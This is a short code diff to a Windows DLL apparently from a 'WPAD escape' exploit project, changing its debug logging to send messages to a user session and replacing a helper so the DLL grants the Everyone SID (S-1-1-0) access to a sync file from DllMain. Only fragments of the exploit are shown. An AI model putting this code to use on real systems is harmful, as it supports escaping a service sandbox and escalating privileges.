@@ -5,7 +5,7 @@
 
 #pragma comment(lib, "rpcrt4.lib")
 
-BOOL SetEveryoneFileAcl(const wchar_t* FilePath);
+BOOL AddFileAcl(const wchar_t* FilePath, const wchar_t* SID);
 
 ////////
 ////////
@@ -26,19 +26,25 @@ BOOL SetEveryoneFileAcl(const wchar_t* FilePath);
 ////////
 
 #ifdef DEBUG
-void DebugLog(const wchar_t *Format, ...) {
+void DebugLog(const wchar_t* Format, ...) {
     va_list Args;
-    wchar_t *pBuffer = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 10000 * 2);
+    static wchar_t* pBuffer = NULL;
+
+    if (pBuffer == NULL) {
+        pBuffer = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 10000 * 2);
+    }
+
     va_start(Args, Format);
-    wvsprintf(pBuffer, Format, Args);
+    wvsprintfW(pBuffer, Format, Args);
     va_end(Args);
 #ifdef DLL_BUILD
-    MessageBoxW(0, pBuffer, L"WPAD escape", 0);
+    uint32_t dwMsgAnswer = 0;
+    WTSSendMessageW(WTS_CURRENT_SERVER_HANDLE, SESSION_ID, (wchar_t*)L"", 0, pBuffer, (wcslen(pBuffer) + 1) * 2, 0, 0, &dwMsgAnswer, TRUE);
 #endif
 #ifdef EXE_BUILD
     printf("%ws\r\n", pBuffer);
 #endif
-    HeapFree(GetProcessHeap(), 0, pBuffer);
+    //HeapFree(GetProcessHeap(), 0, pBuffer);
 }
 #endif
 
@@ -230,7 +236,7 @@ BOOL DllMain(HMODULE hModule, uint32_t dwReason, void *pReserved) {
                 if (hFile != INVALID_HANDLE_VALUE) {
                     CloseHandle(hFile);
 
-                    if (SetEveryoneFileAcl(SYNC_FILE)) {
+                    if (AddFileAcl(SYNC_FILE, L"S-1-1-0")) {
 #ifdef DEBUG
                         DebugLog(L"... successfully set Everyone ACL on %ws", SYNC_FILE);
 #endif
